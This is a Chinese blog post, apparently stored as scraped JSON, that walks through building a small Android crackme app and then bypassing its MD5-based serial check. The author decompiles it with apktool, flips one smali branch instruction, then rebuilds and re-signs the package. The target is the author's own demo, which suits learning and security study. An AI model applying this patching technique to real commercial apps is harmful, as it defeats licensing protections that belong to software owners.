((userName==null)||(userName.length()==0))\n                return false;\n            if ((sn==null)||(sn.length()==0))\n                return false;\n            MessageDigest digest=MessageDigest.getInstance(\"MD5\");\n            digest.reset();\n            digest.update(userName.getBytes());\n            byte[] bytes=digest.digest();\n            String hexstr= bytesToHex(bytes);\n            StringBuilder sb = new StringBuilder();\n            for (int i=0;i<hexstr.length();i+=2){\n                sb.append(hexstr.charAt(i));\n            }\n            String userSN=sb.toString();\n            if (!userSN.equalsIgnoreCase(sn))\n                return false;\n        } catch (NoSuchAlgorithmException e){\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n}\n```\napp/res/values/strings.xml\n```\n<resources>\n    <string name=\"app_name\">Crackme01</string>\n    <string name=\"unregister\">程序未注册</string>\n    <string name=\"unsucessed\">无效用户名或注册码</string>\n    <string name=\"successed\">恭喜您！注册成功</string>\n    <string name=\"registered\">程序已注册</string>\n    <string name=\"str_register\">注册</string>\n    <string name=\"str_androidInstance\">Android程序破解演示实例</string>\n    <string name=\"str_username\">用户名</string>\n    <string name=\"str_serialNo\">注册码</string>\n    <string name=\"str_pleaseinputusername\">请输入用户名</string>\n    <string name=\"str_input16chars\">请输入16位注册码</string>\n</resources>\n```\n## 让程序Run起来\n在AS中run - Run\"app\"，如果没有虚拟机，可以新建一个。\n![RUN起来](Android开发及破解入门实例/Screenshot_01.png)\n\n## 发布APK\n\n- \"Build -> Build APK\" 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）\n\n- \"Build -> Generate Signed APK\"。选择keystore然后Next就可以了。\n\n    ![生成keystore](Android开发及破解入门实例/Screenshot_02.png)\n    此处也可以用keytool工具生成keystore文件。命令如下：\n    ```bash\n    keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000\n    ```\n## APK逆向\n>   APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。\n\n- apktool  用于反编译和重新编译\n\n```\n➜  apktool d crackme01.apk\nI: Using Apktool 2.2.3 on crackme01.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\n\n- 把整个生成的crackme01文件夹拽入visual studio code中。\n\n- 搜索关键字\"无效用户名或注册码\"，在res/values/strings.xml中找到:\n>       <string name=\"unsucessed\">无效用户名或注册码</string>\n- 搜索关键字\"unsucessed\",在res/values/public.xml中找到:\n>       <public type=\"string\" name=\"unsucessed\" id=\"0x7f06002b\" />\n- 搜索关键字\"0x7f06002b\",在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。\n\n![smali代码](Android开发及破解入门实例/Screenshot_03.png)\n\n- 具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。\n\n- 重新生成APK\n```\n➜  apktool b crackme01\nI: Using Apktool 2.2.3\nI: Checking whether sources has changed...\nI: Smaling smali folder into classes.dex...\nI: Checking whether resources has changed...\nI: Building resources...\nI: Building apk file...\nI: Copying unknown files/dir...\n# 生成的APK在crackme01/dist/crackme01.apk\n```\n\n- 重新签名\n\n```\n➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa\n输入密钥库的密码短语:\n   正在添加: META-INF/MANIFEST.MF\n   正在添加: META-INF/AAA.SF\n   正在添加: META-INF/AAA.RSA\n  正在签名: AndroidManifest.xml\n  正在签名: classes.dex\n  ......\n  正在签名: resources.arsc\njar 已签名。\n```\n![安装到虚拟机上运行](Android开发及破解入门实例/Screenshot_04.png)\n\n\n## 后记\n    路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。","source":"_posts/Android开发及破解入门实例.md","raw":"---\ntitle: Android开发及破解入门实例\ndate: 2017-07-03 16:12:55\ntags: Android\n---\n>   原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。\n\n## 开发环境安装\n\n[Android开发者官网](https://developer.android.com)\n\n[Android Studio下载页面](https://developer.android.com/studio/index.html)\n\n[Android Studio 2.3.3.0 for mac下载直连](https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg)\n\n[Android NDK](https://developer.android.com/ndk/downloads/index.html) # 其实这个工具在这里并没有用到，可以等后续再下载安装。\n\n\\# Android Studio包含了JDK，故而不需要单独安装JDK。\n上述链接应该是都需要翻墙才能访问。\n\n<!--more-->\n\n## 项目编码\n打开AS，一路Next，就新建好一个项目。\n\n>   第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（[gradle-3.3](https://services.gradle.org/distributions/gradle-3.3-all.zip\n)），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。\n\n打开app/res/layout/activity_main.xml,设计layout。\n\n采用Android最新的约束性布局ConstraintLayout。\n\n![设计效果](Android开发及破解入门实例/constraintLayout.png)\n具体的xml代码如下：\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.constraint.ConstraintLayout\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\"cn.oddboy.xx.crackme01.MainActivity\"\n    tools:layout_editor_absoluteY=\"81dp\"\n    tools:layout_editor_absoluteX=\"0dp\">\n\n    <TextView\n        android:id=\"@+id/textView\"\n        android:layout_width=\"368dp\"\n        android:layout_height=\"25dp\"\n        android:text=\"@string/str_androidInstance\"\n        android:textAlignment=\"center\"\n        android:textAllCaps=\"false\"\n        android:textSize=\"18sp\"\n        android:textStyle=\"bold\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintBottom_toTopOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"parent\" />\n\n    <TextView\n        android:id=\"@+id/textView2\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_serialNo\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/sn\"\n        app:layout_constraintTop_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintRight_toLeftOf=\"@+id/sn\" />\n\n    <TextView\n        android:id=\"@+id/textView3\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"17dp\"\n        android:text=\"@string/str_username\"\n        android:textAlignment=\"center\"\n        android:textSize=\"14sp\"\n        app:layout_constraintBottom_toBottomOf=\"@+id/userName\"\n        app:layout_constraintTop_toTopOf=\"@+id/userName\"\n        app:layout_constraintRight_toLeftOf=\"@+id/userName\"\n        app:layout_constraintLeft_toLeftOf=\"parent\" />\n\n    <EditText\n        android:id=\"@+id/sn\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_input16chars\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/button\"\n        app:layout_constraintLeft_toLeftOf=\"@+id/userName\"\n        app:layout_constraintRight_toRightOf=\"@+id/userName\"\n        app:layout_constraintTop_toBottomOf=\"@+id/userName\" />\n\n    <EditText\n        android:id=\"@+id/userName\"\n        android:layout_width=\"215dp\"\n        android:layout_height=\"43dp\"\n        android:ems=\"10\"\n        android:hint=\"@string/str_pleaseinputusername\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toTopOf=\"@+id/sn\"\n        app:layout_constraintLeft_toRightOf=\"@+id/textView3\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintTop_toBottomOf=\"@+id/textView\" />\n\n    <Button\n        android:id=\"@+id/button\"\n        android:layout_width=\"88dp\"\n        android:layout_height=\"48dp\"\n        android:text=\"@string/str_register\"\n        app:layout_constraintTop_toBottomOf=\"@+id/sn\"\n        app:layout_constraintRight_toRightOf=\"parent\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        android:layout_marginTop=\"-13dp\"\n        app:layout_constraintHorizontal_bias=\"0.858\" />\n\n</android.support.constraint.ConstraintLayout>\n\n```\n\n打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。\n\n```\npackage cn.oddboy.xx.crackme01;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\n\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\n\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        setTitle(R.string.unregister);\n        final EditText edit_userName=(EditText)findViewById(R.id.userName);\n        final EditText edit_sn=(EditText)findViewById(R.id.sn);\n        final Button btn_reg=(Button)findViewById(R.id.button);\n        btn_reg.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) {\n                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();\n                }else {\n                    Toast.makeText(MainActivity.this,\n                            R.string.successed,Toast.LENGTH_SHORT).show();\n                    btn_reg.setEnabled(false);\n                    setTitle(R.string.registered);\n                }\n            }\n        });\n    }\n    public static String bytesToHex(byte[] in) {\n        final StringBuilder builder = new StringBuilder();\n        for(byte b : in) {\n            builder.append(String.format(\"%02x\", b));\n        }\n        return builder.toString();\n    }\n    private boolean checkSN(String userName, String sn){\n        try{\n            if ((userName==null)||(userName.length()==0))\n                return false;\n            if ((sn==null)||(sn.length()==0))\n                return false;\n            MessageDigest digest=MessageDigest.getInstance(\"MD5\");\n            digest.reset();\n            digest.update(userName.getBytes());\n            byte[] bytes=digest.digest();\n            String hexstr= bytesToHex(bytes);\n            StringBuilder sb = new StringBuilder();\n            for (int i=0;i<hexstr.length();i+=2){\n                sb.append(hexstr.charAt(i));\n            }\n            String userSN=sb.toString();\n            if (!userSN.equalsIgnoreCase(sn))\n                return false;\n        } catch (NoSuchAlgorithmException e){\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n}\n```\napp/res/values/strings.xml\n```\n<resources>\n    <string name=\"app_name\">Crackme01</string>\n    <string name=\"unregister\">程序未注册</string>\n    <string name=\"unsucessed\">无效用户名或注册码</string>\n    <string name=\"successed\">恭喜您！注册成功</string>\n    <string name=\"registered\">程序已注册</string>\n    <string name=\"str_register\">注册</string>\n    <string name=\"str_androidInstance\">Android程序破解演示实例</string>\n    <string name=\"str_username\">用户名</string>\n    <string name=\"str_serialNo\">注册码</string>\n    <string name=\"str_pleaseinputusername\">请输入用户名</string>\n    <string name=\"str_input16chars\">请输入16位注册码</string>\n</resources>\n```\n## 让程序Run起来\n在AS中run - Run\"app\"，如果没有虚拟机，可以新建一个。\n![RUN起来](Android开发及破解入门实例/Screenshot_01.png)\n\n## 发布APK\n\n- \"Build -> Build APK\" 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）\n\n- \"Build -> Generate Signed APK\"。选择keystore然后Next就可以了。\n\n    ![生成keystore](Android开发及破解入门实例/Screenshot_02.png)\n    此处也可以用keytool工具生成keystore文件。命令如下：\n    ```bash\n    keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000\n    ```\n## APK逆向\n>   APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。\n\n- apktool  用于反编译和重新编译\n\n```\n➜  apktool d crackme01.apk\nI: Using Apktool 2.2.3 on crackme01.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\n\n- 把整个生成的crackme01文件夹拽入visual studio code中。\n\n- 搜索关键字\"无效用户名或注册码\"，在res/values/strings.xml中找到:\n>       <string name=\"unsucessed\">无效用户名或注册码</string>\n- 搜索关键字\"unsucessed\",在res/values/public.xml中找到:\n>       <public type=\"string\" name=\"unsucessed\" id=\"0x7f06002b\" />\n- 搜索关键字\"0x7f06002b\",在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。\n\n![smali代码](Android开发及破解入门实例/Screenshot_03.png)\n\n- 具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。\n\n- 重新生成APK\n```\n➜  apktool b crackme01\nI: Using Apktool 2.2.3\nI: Checking whether sources has changed...\nI: Smaling smali folder into classes.dex...\nI: Checking whether resources has changed...\nI: Building resources...\nI: Building apk file...\nI: Copying unknown files/dir...\n# 生成的APK在crackme01/dist/crackme01.apk\n```\n\n- 重新签名\n\n```\n➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa\n输入密钥库的密码短语:\n   正在添加: META-INF/MANIFEST.MF\n   正在添加: META-INF/AAA.SF\n   正在添加: META-INF/AAA.RSA\n  正在签名: AndroidManifest.xml\n  正在签名: classes.dex\n  ......\n  正在签名: resources.arsc\njar 已签名。\n```\n![安装到虚拟机上运行](Android开发及破解入门实例/Screenshot_04.png)\n\n\n## 后记\n    路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。","slug":"Android开发及破解入门实例","published":1,"updated":"2017-07-03T10:11:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hs50001vquv2ikj377k","content":"<blockquote>\n<p>  原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。</p>\n</blockquote>\n<h2 id=\"开发环境安装\"><a href=\"#开发环境安装\" class=\"headerlink\" title=\"开发环境安装\"></a>开发环境安装</h2><p><a href=\"https://developer.android.com\" target=\"_blank\" rel=\"external\">Android开发者官网</a></p>\n<p><a href=\"https://developer.android.com/studio/index.html\" target=\"_blank\" rel=\"external\">Android Studio下载页面</a></p>\n<p><a href=\"https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg\" target=\"_blank\" rel=\"external\">Android Studio 2.3.3.0 for mac下载直连</a></p>\n<p><a href=\"https://developer.android.com/ndk/downloads/index.html\" target=\"_blank\" rel=\"external\">Android NDK</a> # 其实这个工具在这里并没有用到，可以等后续再下载安装。</p>\n<p># Android Studio包含了JDK，故而不需要单独安装JDK。<br>上述链接应该是都需要翻墙才能访问。</p>\n<a id=\"more\"></a>\n<h2 id=\"项目编码\"><a href=\"#项目编码\" class=\"headerlink\" title=\"项目编码\"></a>项目编码</h2><p>打开AS，一路Next，就新建好一个项目。</p>\n<blockquote>\n<p>  第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（<a href=\"https://services.gradle.org/distributions/gradle-3.3-all.zip\" target=\"_blank\" rel=\"external\">gradle-3.3</a>），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。</p>\n</blockquote>\n<p>打开app/res/layout/activity_main.xml,设计layout。</p>\n<p>采用Android最新的约束性布局ConstraintLayout。</p>\n<p><img src=\"/2017/07/Android开发及破解入门实例/constraintLayout.png\" alt=\"设计效果\"><br>具体的xml代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class=\"line\">&lt;android.support.constraint.ConstraintLayout</div><div class=\"line\">    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</div><div class=\"line\">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</div><div class=\"line\">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</div><div class=\"line\">    android:layout_width=&quot;match_parent&quot;</div><div class=\"line\">    android:layout_height=&quot;match_parent&quot;</div><div class=\"line\">    tools:context=&quot;cn.oddboy.xx.crackme01.MainActivity&quot;</div><div class=\"line\">    tools:layout_editor_absoluteY=&quot;81dp&quot;</div><div class=\"line\">    tools:layout_editor_absoluteX=&quot;0dp&quot;&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView&quot;</div><div class=\"line\">        android:layout_width=&quot;368dp&quot;</div><div class=\"line\">        android:layout_height=&quot;25dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_androidInstance&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textAllCaps=&quot;false&quot;</div><div class=\"line\">        android:textSize=&quot;18sp&quot;</div><div class=\"line\">        android:textStyle=&quot;bold&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView2&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_serialNo&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/sn&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView3&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_username&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/sn&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_input16chars&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/button&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/userName&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/userName&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_pleaseinputusername&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toRightOf=&quot;@+id/textView3&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/textView&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;Button</div><div class=\"line\">        android:id=&quot;@+id/button&quot;</div><div class=\"line\">        android:layout_width=&quot;88dp&quot;</div><div class=\"line\">        android:layout_height=&quot;48dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_register&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        android:layout_marginTop=&quot;-13dp&quot;</div><div class=\"line\">        app:layout_constraintHorizontal_bias=&quot;0.858&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;/android.support.constraint.ConstraintLayout&gt;</div></pre></td></tr></table></figure></p>\n<p>打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div></pre></td><td class=\"code\"><pre><div class=\"line\">package cn.oddboy.xx.crackme01;</div><div class=\"line\"></div><div class=\"line\">import android.support.v7.app.AppCompatActivity;</div><div class=\"line\">import android.os.Bundle;</div><div class=\"line\">import android.view.View;</div><div class=\"line\">import android.widget.Button;</div><div class=\"line\">import android.widget.EditText;</div><div class=\"line\">import android.widget.Toast;</div><div class=\"line\"></div><div class=\"line\">import java.security.MessageDigest;</div><div class=\"line\">import java.security.NoSuchAlgorithmException;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">public class MainActivity extends AppCompatActivity &#123;</div><div class=\"line\"></div><div class=\"line\">    @Override</div><div class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class=\"line\">        super.onCreate(savedInstanceState);</div><div class=\"line\">        setContentView(R.layout.activity_main);</div><div class=\"line\">        setTitle(R.string.unregister);</div><div class=\"line\">        final EditText edit_userName=(EditText)findViewById(R.id.userName);</div><div class=\"line\">        final EditText edit_sn=(EditText)findViewById(R.id.sn);</div><div class=\"line\">        final Button btn_reg=(Button)findViewById(R.id.button);</div><div class=\"line\">        btn_reg.setOnClickListener(new View.OnClickListener() &#123;</div><div class=\"line\">            @Override</div><div class=\"line\">            public void onClick(View view) &#123;</div><div class=\"line\">                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();</div><div class=\"line\">                &#125;else &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this,</div><div class=\"line\">                            R.string.successed,Toast.LENGTH_SHORT).show();</div><div class=\"line\">                    btn_reg.setEnabled(false);</div><div class=\"line\">                    setTitle(R.string.registered);</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;);</div><div class=\"line\">    &#125;</div><div class=\"line\">    public static String bytesToHex(byte[] in) &#123;</div><div class=\"line\">        final StringBuilder builder = new StringBuilder();</div><div class=\"line\">        for(byte b : in) &#123;</div><div class=\"line\">            builder.append(String.format(&quot;%02x&quot;, b));</div><div class=\"line\">        &#125;</div><div class=\"line\">        return builder.toString();</div><div class=\"line\">    &#125;</div><div class=\"line\">    private boolean checkSN(String userName, String sn)&#123;</div><div class=\"line\">        try&#123;</div><div class=\"line\">            if ((userName==null)||(userName.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            if ((sn==null)||(sn.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            MessageDigest digest=MessageDigest.getInstance(&quot;MD5&quot;);</div><div class=\"line\">            digest.reset();</div><div class=\"line\">            digest.update(userName.getBytes());</div><div class=\"line\">            byte[] bytes=digest.digest();</div><div class=\"line\">            String hexstr= bytesToHex(bytes);</div><div class=\"line\">            StringBuilder sb = new StringBuilder();</div><div class=\"line\">            for (int i=0;i&lt;hexstr.length();i+=2)&#123;</div><div class=\"line\">                sb.append(hexstr.charAt(i));</div><div class=\"line\">            &#125;</div><div class=\"line\">            String userSN=sb.toString();</div><div class=\"line\">            if (!userSN.equalsIgnoreCase(sn))</div><div class=\"line\">                return false;</div><div class=\"line\">        &#125; catch (NoSuchAlgorithmException e)&#123;</div><div class=\"line\">            e.printStackTrace();</div><div class=\"line\">            return false;</div><div class=\"line\">        &#125;</div><div class=\"line\">        return true;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>app/res/values/strings.xml<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;resources&gt;</div><div class=\"line\">    &lt;string name=&quot;app_name&quot;&gt;Crackme01&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;</div><div 